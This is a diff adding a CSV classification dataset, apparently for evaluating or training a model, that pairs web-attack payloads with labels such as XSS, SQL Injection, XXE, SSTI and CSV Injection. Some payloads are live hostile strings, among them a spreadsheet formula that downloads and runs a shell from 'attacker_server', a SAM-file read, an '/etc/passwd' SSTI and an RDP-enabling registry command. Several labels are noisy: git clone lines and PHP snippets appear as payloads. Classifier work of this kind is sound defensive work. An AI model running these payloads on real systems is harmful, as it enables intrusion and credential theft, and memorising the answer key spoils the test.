@@ -1,0 +1,127 @@
+input,expected_output
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <a href=index.php?page=file1.php> Files </a>",RFI/LFI
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: $ page = chop ($ _ GET [page]);",RFI/LFI
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: $ page = $ _GET [page];",RFI/LFI
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <iframe src=http://ha.ckers.org/scriptlet.html <",XSS
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: =10+20+cmd|' /C calc'!A0",CSV Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: include ($ page);",RFI/LFI
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <!ENTITY ac SYSTEM ""php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php"">]>",XXE
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: //www.whitelisteddomain.tld@https:///www.google.com/%2e%2e",Open Redirect
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",SSTI
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",XXE
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <!--?xml version=""1.0"" ?-->",XXE
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: https://github.com/payloadbox/directory-payload-list.git",Directory Traversal
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: and (select substring(@@version,3,1))='c'",SQL Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",XSS
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",SSTI
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",XSS
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <!ENTITY lol2 ""&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"">",XXE
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: ; echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: root@ismailtasdelen:~# git clone git@github.com:payloadbox/csv-injection-payloads.git",CSV Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: =cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1",CSV Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",XSS
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0",CSV Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: or benchmark(50000000,MD5(1))--",SQL Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: ORDER BY 9#",SQL Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: ; type C:\Windows\repair\SAM",Command Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: git@github.com:payloadbox/directory-payload-list.git",Directory Traversal
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: \n/usr/bin/id\n",Command Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: system('pwd');",Command Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: {{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",SSTI
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: //%5cgoogle.com",Open Redirect
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: && reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: http:www.whitelisteddomain.tld@0330.072.0326.0316",Open Redirect
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: ORDER BY 30--",SQL Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: http://[::ffff:216.58.214.206]",Open Redirect
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: =cmd|' /C notepad'!'A1'",CSV Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: <!DOCTYPE test [ <!ENTITY % init SYSTEM ""data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk""> %init; ]><foo/>",XXE
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: --><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->",XSS
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: include ($ page);",RFI/LFI
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: UNION ALL SELECT 1,2",SQL Injection
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git",SSTI
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: javascript:alert(1)",Open Redirect
+"Classify this security payload into one of: XSS, SQL Injection, Command Injection, Open Redirect, RFI/LFI, XXE, SSTI, CSV Injection, Directory Traversal.
+
+Payload: {{['cat\x20/etc/passwd']|filter('system')}}",SSTI
